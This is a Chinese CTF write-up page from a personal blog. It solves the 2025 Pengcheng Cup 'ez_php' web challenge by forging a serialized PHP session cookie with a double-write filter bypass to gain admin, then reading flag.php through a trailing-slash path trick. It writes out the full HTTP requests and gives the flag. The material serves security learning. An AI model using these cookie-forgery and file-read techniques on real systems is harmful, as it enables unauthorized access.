@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025年鹏城杯CTF例题writeup | DIOINNET'S WORLD</title><meta name="author" content="Dioinnet"><meta name="copyright" content="Dioinnet"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Webez_php题目给了一个地址，可以进行访问首先我们进入题目地址发现是一个登陆页面： 我用burp进行抓包：可以在GET传参发现cookie： 1TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6Imd1ZXN0Ijt9 通过Base64解码可以得到： 关于现在的cookie是guest权限，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025年鹏城杯CTF例题writeup">
+<meta property="og:url" content="http://example.com/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/index.html">
+<meta property="og:site_name" content="DIOINNET&#39;S WORLD">
+<meta property="og:description" content="Webez_php题目给了一个地址，可以进行访问首先我们进入题目地址发现是一个登陆页面： 我用burp进行抓包：可以在GET传参发现cookie： 1TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6Imd1ZXN0Ijt9 通过Base64解码可以得到： 关于现在的cookie是guest权限，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/liang2.png">
+<meta property="article:published_time" content="2026-06-06T13:22:41.000Z">
+<meta property="article:modified_time" content="2026-06-06T13:40:06.097Z">
+<meta property="article:author" content="Dioinnet">
+<meta property="article:tag" content="鹏城杯CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/liang2.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025年鹏城杯CTF例题writeup",
+  "url": "http://example.com/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/",
+  "image": "http://example.com/img/liang2.png",
+  "datePublished": "2026-06-06T13:22:41.000Z",
+  "dateModified": "2026-06-06T13:40:06.097Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Dioinnet",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025年鹏城杯CTF例题writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/img/star.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/liang2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DIOINNET'S WORLD</span></a><a class="nav-page-title" href="/"><span class="site-name">2025年鹏城杯CTF例题writeup</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025年鹏城杯CTF例题writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-06T13:22:41.000Z" title="发表于 2026-06-06 21:22:41">2026-06-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-06T13:40:06.097Z" title="更新于 2026-06-06 21:40:06">2026-06-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h4><p>题目给了一个地址，可以进行访问<br>首先我们进入题目地址发现是一个登陆页面：<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%871.png" alt="初始情况"></p>
+<p>我用burp进行抓包：<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%872.png" alt="抓包截图"><br>可以在GET传参发现cookie：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6Imd1ZXN0Ijt9</span><br></pre></td></tr></table></figure>
+<p>通过Base64解码可以得到：<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%873.png" alt="解码"></p>
+<p>关于现在的cookie是guest权限，可以试试反序列化进行伪造，使得我们拥有admin权限，于是将guest改成admin再进行传参（这时会发现字节数有误，即admin应该是被系统检测删去了），这时可以尝试在一连字串里面夹杂admin，发现双写和isAdmin都可以进行替换<br>于是尝试双写绕过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Cookie: identification=TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6ImFkYWRtaW5taW4iO30=</span><br><span class="line">得到：</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: nginx/1.22.1</span><br><span class="line">Date: Sat, 13 Dec 2025 04:55:07 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/7.4.33</span><br><span class="line">Location: dashboard.php</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>发现：Location: dashboard.php，即我们获取了admin权限<br>接着我们访问下dashboard.php:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard.php HTTP/1.1</span><br><span class="line">Host: 192.168.18.22:25005</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.18.22:25005/   </span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: identification=TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6ImFkYWRtaW5taW4iO30=</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%874.png" alt="访问后"></p>
+<p>看上去我们有文件需要读取，于是用disearch扫描一下看看<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%875.png" alt="扫描发现"></p>
+<p>发现有flag.php,试试能不能直接读，dashboard.php?filename&#x3D;flag.php<br>发现不行，试了下斜杠绕过dashboard.php?filename&#x3D;flag.php&#x2F;<br>完整：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard.php?filename=flag.php/ HTTP/1.1</span><br><span class="line">Host: 192.168.18.22:25005</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.18.22:25005/   </span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: identification=TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6ImFkYWRtaW5taW4iO30=</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%875.png" alt="flag界面"></p>
+<p>在源码的noticeboard那里找到并复制提交<br><img src="/img/25%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/%E5%9B%BE%E7%89%875.png" alt="flag界面"></p>
+<p>flag&#x3D;’flag{8fee436d-176e-4b69-80ce-3b2ed0eee331}’</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Dioinnet</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/">http://example.com/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">DIOINNET'S WORLD</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF/">鹏城杯CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/liang2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/25/Web%E7%9B%B8%E5%85%B3%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" title="HTTP协议"><img class="cover" src="/img/liang2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">HTTP协议</div></div><div class="info-2"><div class="info-item-1">HTTPHTTP是一种用作获取诸如HTML文档这类资源的协议，通过TCP或TLS（一种加密过的TCP连接） 可以控制的常见特性1.缓存：HTTP可以控制文档如何被缓存2.开放同源限制：同源限制就是Web浏览器强制在不同网站之间做的严格分割，只有来自于相同来源的网页才能获取一个网页的全部信息。HTTP可以减弱这种严格分离3.认证：即网页对特定用户的认证，特定用户才可以访问。HTTP可以直接提供基本认证功能4.代理服务器和隧道：服务器或客户端一般处于内网，是会对其他计算机隐藏真实ip地址。HTTP请求就要通过代理服务器越过这个网络屏障（注意：并非所有代理都是HTTP代理）5.会话：在HTTP Cookie的帮助下，可以利用服务端的状态将不同请求联系在一起，即创建了对话 HTTP 流流即为流水线1.开启一个TCP连接2.发送一个HTTP报文3.读取服务端返回的报文信息4.关闭连接或者为后续请求重用连接 HTTP报文两种类型：请求和相应 请求123GET / HTTP/1.1Host: developer.mozilla.orgAccept-Language: fr 其中有以下元素：1....</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Dioinnet</div><div class="author-info-description">仰天大笑出门去，我辈岂是蓬蒿人</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Dioinnet"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">知识多为计算机相关，愿各位能在此觅得解惑之宝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-php"><span class="toc-number">1.1.</span> <span class="toc-text">ez_php</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/" title="2025年鹏城杯CTF例题writeup"><img src="/img/liang2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年鹏城杯CTF例题writeup"/></a><div class="content"><a class="title" href="/2026/06/06/2025%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFCTF%E4%BE%8B%E9%A2%98writeup/" title="2025年鹏城杯CTF例题writeup">2025年鹏城杯CTF例题writeup</a><time datetime="2026-06-06T13:22:41.000Z" title="发表于 2026-06-06 21:22:41">2026-06-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/Web%E7%9B%B8%E5%85%B3%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" title="HTTP协议"><img src="/img/liang2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP协议"/></a><div class="content"><a class="title" href="/2025/09/25/Web%E7%9B%B8%E5%85%B3%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" title="HTTP协议">HTTP协议</a><time datetime="2025-09-25T12:37:27.000Z" title="发表于 2025-09-25 20:37:27">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/12/Linux%E5%9F%BA%E7%A1%80/" title="Linux基础"><img src="/img/linux.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux基础"/></a><div class="content"><a class="title" href="/2025/09/12/Linux%E5%9F%BA%E7%A1%80/" title="Linux基础">Linux基础</a><time datetime="2025-09-12T03:37:30.000Z" title="发表于 2025-09-12 11:37:30">2025-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/12/Linux%E5%91%BD%E4%BB%A4/" title="Linux命令合集"><img src="/img/linux1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux命令合集"/></a><div class="content"><a class="title" href="/2025/09/12/Linux%E5%91%BD%E4%BB%A4/" title="Linux命令合集">Linux命令合集</a><time datetime="2025-09-11T17:05:58.000Z" title="发表于 2025-09-12 01:05:58">2025-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/22/2025%E5%B9%B4Aurora-%E6%96%B0%E7%94%9F%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="AuroraCTF2024 新生赛题目复现"><img src="/img/Aurora2024%E6%96%B0%E7%94%9F%E8%B5%9B/%E5%B0%81%E9%9D%A2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AuroraCTF2024 新生赛题目复现"/></a><div class="content"><a class="title" href="/2025/05/22/2025%E5%B9%B4Aurora-%E6%96%B0%E7%94%9F%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="AuroraCTF2024 新生赛题目复现">AuroraCTF2024 新生赛题目复现</a><time datetime="2025-05-22T06:15:12.000Z" title="发表于 2025-05-22 14:15:12">2025-05-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By Dioinnet</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="patience,is,the,key,of,life" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
